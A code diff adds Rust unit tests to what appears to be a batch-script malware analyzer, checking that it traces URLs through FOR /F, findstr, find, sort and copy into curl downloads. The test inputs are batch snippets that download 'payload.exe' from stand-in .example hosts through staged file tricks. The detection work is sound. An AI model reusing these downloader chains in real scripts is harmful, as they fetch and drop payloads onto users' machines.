@@ -2950,6 +2950,205 @@ for /f "tokens=* delims=" %%U in ('sort urls.txt ^| find "https://"') do curl -o
     }
 
     #[test]
+    fn for_f_type_wildcard_reads_generated_file_source() {
+        let report = analyze(
+            br#"echo noise>noise.txt
+echo https://for-f-type-wildcard.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%U in ('type *.txt ^| find "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-type-wildcard.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F type wildcard source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_findstr_g_pattern_file_filters_generated_file_source() {
+        let report = analyze(
+            br#"echo needle.example>patterns.txt
+echo https://other.example/payload.exe>web.txt
+echo https://needle.example/payload.exe>>web.txt
+for /f "tokens=* delims=" %%U in ('findstr /g:patterns.txt web.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://needle.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F findstr /g pattern file did not feed matching curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://other.example/payload.exe"
+                )
+            }),
+            "FOR /F findstr /g pattern file overmatched nonmatching URL: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_findstr_f_file_list_reads_generated_file_source() {
+        let report = analyze(
+            br#"echo web.txt>files.txt
+echo noise>web.txt
+echo https://findstr-file-list.example/payload.exe>>web.txt
+for /f "tokens=* delims=" %%U in ('findstr /f:files.txt "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://findstr-file-list.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F findstr /f file list did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn sort_output_file_feeds_later_for_f_source() {
+        let report = analyze(
+            br#"echo zzz>urls.txt
+echo https://sort-output-file.example/payload.exe>>urls.txt
+sort urls.txt /o sorted.txt
+for /f "tokens=* delims=" %%U in ('type sorted.txt ^| find "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://sort-output-file.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "sort /o output file did not feed later FOR /F source: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn sort_exe_output_file_is_case_insensitive() {
+        let report = analyze(
+            br#"echo zzz>urls.txt
+echo https://sort-exe-output-file.example/payload.exe>>urls.txt
+SORT.EXE /O sorted.txt urls.txt
+for /f "tokens=* delims=" %%U in ('type sorted.txt ^| find "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://sort-exe-output-file.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "SORT.EXE /O output file did not feed later FOR /F source: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_findstr_n_line_number_prefix_can_be_stripped() {
+        let report = analyze(
+            br#"echo noise>web.txt
+echo https://findstr-line-number.example/payload.exe>>web.txt
+for /f "tokens=1,* delims=:" %%A in ('findstr /n "https://" web.txt') do curl -o payload.exe %%B"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://findstr-line-number.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F did not strip findstr /n prefix for later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_findstr_o_offset_prefix_can_be_stripped() {
+        let report = analyze(
+            br#"echo https://findstr-offset.example/payload.exe>web.txt
+for /f "tokens=1,* delims=:" %%A in ('findstr /o "https://" web.txt') do curl -o payload.exe %%B"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://findstr-offset.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F did not strip findstr /o prefix for later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_find_n_line_number_prefix_can_be_stripped() {
+        let report = analyze(
+            br#"echo noise>web.txt
+echo https://find-line-number.example/payload.exe>>web.txt
+for /f "tokens=1,* delims=]" %%A in ('find /n "https://" web.txt') do curl -o payload.exe %%B"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://find-line-number.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F did not strip find /n prefix for later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_dir_b_discovers_generated_file_source() {
         let report = analyze(
             br#"echo https://for-f-dir-b.example/payload.exe>url.txt
@@ -10007,6 +10206,25 @@ echo %MARK%
     }
 
     #[test]
+    fn synth_findstr_exact_match_does_not_overmatch_substrings() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "web.txt".to_string(),
+            FsEntry::Content {
+                content: b"prefix https://exact.example/payload.exe\r\nhttps://exact.example/payload.exe\r\n".to_vec(),
+                append: false,
+            },
+        );
+
+        let lines = run_pipeline(
+            r#"findstr /x /c:"https://exact.example/payload.exe" web.txt"#,
+            &mut env,
+        );
+
+        assert_eq!(lines, vec!["https://exact.example/payload.exe".to_string()]);
+    }
+
+    #[test]
     fn synth_sort_reads_tracked_file_argument() {
         let mut env = Environment::new(&Config::default());
         env.modified_filesystem.insert(
@@ -17054,6 +17272,34 @@ call C:\Temp\original.js"#,
             }),
             "copy wildcard to tracked directory did not preserve generated JS content: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn copy_b_wildcard_source_concat_tracked() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "a.part".to_string(),
+            FsEntry::Content {
+                content: b"alpha".to_vec(),
+                append: false,
+            },
+        );
+        env.modified_filesystem.insert(
+            "b.part".to_string(),
+            FsEntry::Content {
+                content: b"beta".to_vec(),
+                append: false,
+            },
+        );
+
+        interpret_line("copy /b *.part out.txt", &mut env);
+
+        let entry = env.modified_filesystem.get("out.txt");
+        assert!(
+            matches!(entry, Some(FsEntry::Content { content, .. }) if content == b"alphabeta"),
+            "copy /b wildcard concat did not preserve combined tracked content: {:?}",
+            entry
         );
     }
 
